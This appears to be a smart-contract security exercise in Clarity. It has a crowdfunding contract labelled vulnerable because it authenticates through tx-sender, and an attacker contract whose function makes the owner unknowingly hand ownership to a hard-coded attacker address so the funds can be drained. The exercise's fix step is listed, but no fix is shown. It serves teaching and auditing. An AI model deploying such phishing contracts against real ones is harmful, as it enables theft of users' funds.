;; Vulnerable contract

(define-constant ERR_ONLY_OWNER (err u100))
(define-constant ERR_CAMPAIGN_DOES_NOT_EXISTS (err u101))
(define-constant ERR_CAMPAIGN_NOT_OVER (err u102))

(define-data-var contractOwner principal tx-sender)
(define-data-var nextCampaignId uint u1)

(define-map Campaigns uint { title: (string-ascii 50), proposedBy: principal, fundsRaised: uint, endsAtBlockHeight: uint })

(define-public (create-campaign (title (string-ascii 50)) (amount uint))
  (let
    (
      (campaignId (var-get nextCampaignId))
    )
    (begin
      (try! (stx-transfer? amount tx-sender (as-contract tx-sender)))
      (map-set Campaigns campaignId { title: title, proposedBy: tx-sender, fundsRaised: amount, endsAtBlockHeight: (+ block-height u144) })
      (ok (var-set nextCampaignId (+ campaignId u1)))
    )
  )
)

(define-public (change-owner (newOwner principal))
  (begin
    (asserts! (is-eq tx-sender (var-get contractOwner)) ERR_ONLY_OWNER)
    (ok (var-set contractOwner newOwner))
  )
)

;; Only the `contractOwner` can control the withdraw of funds
(define-public (withdraw-funds (campaignId uint) (destinationAddress principal))
  (begin
    (asserts! (is-eq tx-sender (var-get contractOwner)) ERR_ONLY_OWNER)
    (asserts! (is-some (get-campaign campaignId)) ERR_CAMPAIGN_DOES_NOT_EXISTS)
    (if (>= block-height (unwrap-panic (get endsAtBlockHeight (get-campaign campaignId))))
      (as-contract (stx-transfer? (unwrap-panic (get fundsRaised (get-campaign campaignId))) tx-sender destinationAddress))
      ERR_CAMPAIGN_NOT_OVER
    )
  )
)

(define-read-only (get-campaign (id uint))
  (map-get? Campaigns id)
)

(define-read-only (get-owner)
  (var-get contractOwner)
)

;; Steps
;; 1. The vulnerable contract should be deployed at `contract-0`, so make sure to reference it.
;; 2. Write your contract attempting to exploit the vulnerable contract.
;; 3. Deploy an updated vulnerable contract with the necessary changes that would prevent your exploit.


;; Exploiter Contract

;; The problem in vulnerable contract is that, authentication is done via tx-sender in each function.
;; We can create another contract and trick owner to interact with our exploit contract.
;; Since the tx-sender will be the owner, if we call the changeOwner function in vulnerable contract,
;; it will pass the authentication mechanism.


;; Vulnerable contract -> ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.contract-0

;; Let's say, attackers address is -> ST1J4G6RR643BCG8G8SR6M2D9Z9KXT2NJDRK3FBTK

;; This will set owner to attacker address and then we can easily drain funds.
(define-public (steal-ownership-attack (newOwner principal))
    (contract-call? 'ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.contract-0 change-owner 'ST1J4G6RR643BCG8G8SR6M2D9Z9KXT2NJDRK3FBTK)
)